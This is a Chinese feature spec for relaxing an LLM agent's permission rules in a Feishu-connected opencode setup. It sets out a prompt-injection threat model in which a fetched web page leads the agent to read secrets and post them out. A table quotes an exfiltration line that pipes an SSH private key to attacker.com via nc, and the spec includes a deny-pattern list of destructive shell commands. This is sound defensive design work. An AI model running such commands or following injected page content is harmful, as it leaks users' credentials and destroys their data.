---
feat-id: imbot-permission-pragmatic
status: done
related: ./1-spec.md ./2-plan.md ./3-changelog.md
---

# imbot-permission-pragmatic — spec

## 一句话

`imbot` 从 v1 严苛档(bash/edit/write/apply_patch/webfetch 全 ask)退到 v2 务实档(只对 webfetch + 删除类 bash + 敏感目录 read 做 ask),修复"寸步难行"问题,同时 permission-card timeout 5min → 30min。

## 起源

`feishu-bridge-imbot-agent`(v1)落地后实测 — user 跑「让 LLM 帮我创建 GitHub 仓库 + 连接本地 + push」流程,实际表现:

- 一句指令触发 **5-8 张 bash 权限卡**(`gh repo create` / `git init` / `git remote add` / `git push` ...)
- user 点过 5+ 次「始终允许」**仍要点**
- 卡片 5min timeout 频繁触发,自动 reject 解锁后 LLM 再发同类命令又弹

根因诊断(查 opencode source):

1. **bash 的 `always` 按 arity prefix 颗粒度记忆**(`packages/opencode/src/permission/arity.ts` `BashArity.prefix`)
2. `gh repo create` always 后,`gh repo view` / `git init` / `git remote add` / `git push` 全是独立 arity 命令族,各自需要再点一次
3. **5min timeout 太短**(`PermissionCardController` 常量),user 在飞书慢慢点容易撞

## 范围

### A. 重设计 imbot 权限模型 — 安全模型再评估

**v1 思路**:危险工具(bash/edit/write/webfetch)全 ask,user 在飞书每次审批。

**v2 思路**:**重新分析 prompt injection 攻击链**:

```
1. LLM 被 webfetch 来的恶意网页诱导
2. LLM 想 exfil 数据 → 必须先 read 敏感文件
3. 然后用 bash curl 把内容 POST 出去
```

→ 攻击瓶颈在 **read 敏感数据**(第 2 步)+ **webfetch 出境**,bash 本身没数据空转。

**v2 imbot 收紧策略**:
- `webfetch`:全 ask(攻击入口)
- `read`:普通 allow,敏感目录(SSH/AWS/Kube/GPG/Keychain/Crypto)ask
- `bash`:**默认 allow,但删除/不可逆/破坏类必 ask**(per-pattern rule)
- `edit / write / apply_patch`:不设(走 build default allow)

### B. bash 删除/不可逆 pattern 清单

```
// 文件删除
rm * / rmdir * / trash * / unlink *

// git 不可逆
git push --force* / git push -f * / git reset --hard* / git clean -fd* / git branch -D *

// 通用 delete / uninstall(glob 拦)
*delete*   // kubectl delete / gh repo delete / aws ec2 terminate-* / az group delete 等
*uninstall*   // brew/npm/pip/cargo/apt uninstall 等

// 包管理 remove 子命令
npm remove * / npm rm * / bun remove * / brew remove * / apt remove * / apt purge * / yum remove * / dnf remove *

// 容器
docker rm * / docker rmi * / docker volume rm * / docker network rm * / docker system prune*

// 云资源
aws s3 rm * / aws s3 rb * / aws ec2 terminate*

// 系统级
shutdown * / reboot * / halt * / poweroff * / dd * / mkfs* / fdisk *
```

依赖 opencode `Wildcard.match`(`packages/opencode/src/util/wildcard.ts`)+ `evaluate.ts` `findLast` 规则(最后命中的 rule 胜出)。`"*": "allow"` 放第一,具体 pattern 放后面覆盖。

### C. permission-card timeout 5min → 30min

`PermissionCardController` `DEFAULT_TIMEOUT_MS` 改 `30 * 60 * 1000`,对齐 `promptTimeoutMs` 默认 30min — 避免 "permission card 已 auto-reject 但 prompt 还在等" 的状态不一致。

### D. user 升级路径

setup hook idempotent — user 已有 imbot v1 块不会被自动覆盖。升级方法:

```bash
cp ~/.config/opencode/opencode.jsonc ~/.config/opencode/opencode.jsonc.bak-imbot-v2
jq 'del(.agent.imbot)' ~/.config/opencode/opencode.jsonc.bak-imbot-v2 > ~/.config/opencode/opencode.jsonc
# 重启 DeskFox 即生效(setup hook 自动注入 v2)
```

## 安全模型对比

| 攻击 | v1 防御 | v2 防御 |
|---|---|---|
| LLM 跑 `rm -rf ~/`(主动破坏)| ✅(bash ask) | ✅(rm * ask) |
| LLM 跑 `gh repo create`(完成 user 任务)| ❌(bash ask 打扰 user)| ✅(bash *: allow,顺畅)|
| LLM 被 prompt injection 跑 `curl ~/.ssh/id_rsa\|nc attacker.com`(完整攻击链)| ✅(bash ask) | ✅(read **/.ssh/** ask 拦在第 2 步)|
| LLM 跑 `git reset --hard HEAD^^^^`(可逆性差)| ✅(bash ask) | ✅(git reset --hard* ask) |
| LLM 跑 `kubectl delete pod --all`(批量破坏)| ✅(bash ask) | ✅(*delete* ask)|

→ **v2 防御等价 v1**(攻击瓶颈在 read 敏感 + webfetch 不变),但**正常 user 任务**(gh/git/npm install / ls / cat ... 等等)**0 打扰**。

## 验收

- ✅ cargo test feishu_plugin_install 16/16(其中 2 个新 v2 测试覆盖删除 pattern + edit/write 不再被锁)
- ✅ adapter-feishu-lark 262/262
- ✅ monorepo typecheck 16/16
- ✅ user 飞书实测 ship 流程(下次 ship 5.11.2-mac 时实测验证 — 本笔 spec 阶段不真飞书测)

## 不做

- 不引入"超级管理员"概念(bash 全 allow user)— v2 模型已经在 unattended 安全 + 可用性间平衡好
- 不做 "*remove*" 通配(误伤率高 — `find . -name remove.txt` 也 match)
- 不拦 SQL DROP(SQL 嵌在 `psql -c "..."` 里 bash pattern 匹配不到)
- 不拦 `kill -9` / `killall`(常见 restart 操作,影响 user 体验)
- 不做 batch-permission-card 合并审批 UI(scope 太大,留 backlog)

## 规模

Medium — 改 2 个文件(`feishu_plugin_install.rs::imbot_agent_spec` + `permission-card.ts::DEFAULT_TIMEOUT_MS`)+ 2 个新 Rust unit test + 三文档落盘。
